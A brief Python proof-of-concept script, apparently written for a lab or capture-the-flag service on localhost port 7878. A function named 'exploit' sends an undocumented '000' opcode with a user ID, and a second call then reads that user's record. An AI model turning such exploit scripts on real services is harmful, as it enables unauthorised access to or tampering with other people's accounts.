import socket

HOST = "127.0.0.1"
PORT = 7878  

def get_user(userid):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"001\r\n{userid}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")

def exploit(userid):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(f"000\r\n{userid}\r\n".encode('utf-8'))
        data = s.recv(1024)

    print(f"{str(data, 'UTF-8')}\r\n")


print('')
exploit(331431342438875137)
get_user(331431342438875137)